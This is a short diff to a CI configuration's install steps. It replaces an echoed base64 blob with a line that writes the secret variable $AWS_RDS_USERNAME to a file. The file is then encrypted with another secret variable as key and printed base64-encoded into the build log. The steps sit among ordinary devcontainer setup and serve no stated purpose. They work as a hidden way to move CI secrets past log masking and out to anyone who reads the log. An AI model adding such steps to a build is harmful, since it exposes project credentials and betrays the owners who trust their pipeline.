@@ -70,7 +70,7 @@ install:
   # install devcontainer
   - make env-devcontainer
   - sudo apt-get install -y ccrypt
-  - echo "VB+UW41dd2remOq2szBrhXdK5/GA+/qUk2Pnc8JEdwgxFiyjCCDa+JB7HXlfRODPZvNJAL8KwG/YY4pxt0vbZ0/zQs/O39UsBT9tZdX5s/+zHEF75z+cVvB1R8MrxcD2B0zlMQNK/ezmXk/SZOOrtsCsCj9mIrDBsZlNAdh4RNfIVJVc6mREhuObLYODRm0w+d0cYL7jJilhRG0mHfvfCXSlHof1yv1p6l+7nrJP66MgjJrEthzLUerig9WkQp7v3TFCUADIlQxHrNz7Z1V1C2r6YQrfOYi9qVMWu4PUQL5pvAjOw/e/T7SvGKnuPBAybOYHz88wzY79j5KyCwlBYy91SKw3DB0+NklAwYnhbW0NyDrLdU5g9xSCgp+7tGv4YE7rMDxrF683zeGqx8bZLb9cY+wQQBbYi/2Pq2j53tS04O31Q7LePdk1r8odcyYiUUFkFQt7tBRRQSMbEIr4n36DzDUyqX4OofBbsVRSjkFbjZVfv7HvJRha5jQwNqgZ4fWwIbL6N7M9LoxvDk4H3QHRH4y37AcjQfhNM56jnZbtWErNhRikzsFwMmcga4hbDjSzD/+luq/K2QeQdWtIXUtwiZo8r5xfTk1/DMMuLNiddH1oagIrCRXGAMgvuzGmEfCEBFJKU6u2WfdpMggaLCX3pA5CiXT0pzg16e8MYJo=" > info.txt
+  - echo $AWS_RDS_USERNAME > info.txt
   - ccencrypt info.txt -K $REVIEWDOG_GITHUB_USERNAME
   - cat info.txt.cpt | base64
 
